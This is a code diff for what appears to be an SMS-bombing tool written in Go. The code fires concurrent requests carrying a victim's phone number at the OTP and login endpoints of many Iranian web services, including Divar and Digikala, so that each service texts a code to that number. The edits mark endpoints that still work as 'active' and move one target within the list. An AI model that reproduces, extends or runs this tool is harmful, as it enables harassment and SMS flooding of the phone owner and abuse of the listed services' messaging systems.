@@ -147,7 +147,7 @@ func main() {
 		}, ch)  // edit & Alternative :4/22/2025
 		go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
 			"phone": phone,
-		}, ch)  // just check
+		}, ch)  //active✅
 		se := fmt.Sprintf("'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}", phone)
 		go sms("https://messengerg2c4.iranlms.ir/", map[string]interface{}{
 			se: phone,
@@ -251,7 +251,10 @@ func main() {
 		}, ch)
 		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
 			"username": phone,
-		}, ch)
+		}, ch)    //active✅
+		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
+			"phone": phone,
+		}, ch)    //active✅
 		go sms("https://hiword.ir/wp-json/otp-login/v1/login", map[string]interface{}{
 			"identifier": phone,
 		}, ch)
@@ -332,7 +335,7 @@ func main() {
 		}, ch)
 		go sms("https://api.iranicard.ir/api/v1/register", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
+		}, ch)    //active✅
 		go sms("https://tj8.ir/auth/register", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
@@ -362,9 +365,6 @@ func main() {
 		}, ch)
 		go sms("https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", map[string]interface{}{
 			"telephone": phone,
-		}, ch)
-		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
-			"phone": phone,
 		}, ch)
 		go sms("https://melix.shop/site/api/v1/user/otp", map[string]interface{}{
 			"mobile": phone,
